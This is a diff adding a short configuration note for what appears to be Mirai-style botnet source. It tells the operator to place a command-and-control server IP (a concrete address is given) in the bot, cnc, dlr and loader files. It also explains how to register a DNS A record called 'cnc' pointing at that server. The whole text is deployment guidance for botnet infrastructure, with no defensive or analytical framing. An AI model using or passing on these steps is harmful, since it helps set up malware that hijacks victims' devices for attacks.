@@ -1,0 +1,13 @@
+Your server IP on:107.158.154.122   
+ 
+~> /bot/includes.h //107.158.154.122   
+~> /cnc/main.go //107.158.154.122   
+~> /dlr/main.c // 107.158.154.122   
+~> /loader/scanListen.go //107.158.154.122   
+~> /loader/src/main.c // 107.158.154.122   
+Your domain on:
+
+~> /bot/table.c // cnc.xxx.xxx
+
+If you use namecheap.com, go to advanced DNS and create an A record,
+called "cnc" and with the IP of your server.
